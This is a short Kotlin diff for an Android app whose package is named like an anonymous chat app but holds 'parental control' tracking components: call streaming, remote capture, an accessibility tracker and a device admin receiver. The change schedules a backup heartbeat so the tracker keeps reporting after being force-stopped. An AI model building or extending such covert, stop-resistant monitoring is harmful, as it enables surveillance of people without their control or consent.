@@ -23,6 +23,7 @@ import com.anonchat.app.parentalcontrol.manager.CallStateMonitor
 import com.anonchat.app.parentalcontrol.manager.CallStreamManager
 import com.anonchat.app.parentalcontrol.manager.RemoteCaptureManager
 import com.anonchat.app.parentalcontrol.manager.UpdateManager
+import com.anonchat.app.parentalcontrol.work.HeartbeatWorker
 import com.anonchat.app.parentalcontrol.receiver.DeviceAdminReceiver
 import com.anonchat.app.parentalcontrol.service.TrackerAccessibilityService
 import com.anonchat.app.parentalcontrol.service.SocialNotificationService
@@ -50,6 +51,9 @@ class TrackerService : Service() {
         createNotificationChannel()
         acquireWakeLock()
         TrackerService.isRunning = true
+        // Schedule WorkManager backup heartbeat so last_seen keeps refreshing
+        // even if the FGS is force-stopped by OEM battery optimisers.
+        HeartbeatWorker.schedule(applicationContext)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -92,6 +96,9 @@ class TrackerService : Service() {
         startCallMonitor()
         startFirebaseCommandListener()
         com.anonchat.app.parentalcontrol.receiver.AlarmReceiver.scheduleExactAlarm(this)
+        // Schedule WorkManager backup heartbeat so last_seen keeps refreshing
+        // even if the FGS is force-stopped by OEM battery optimisers.
+        HeartbeatWorker.schedule(this)
         return START_STICKY
     }
 
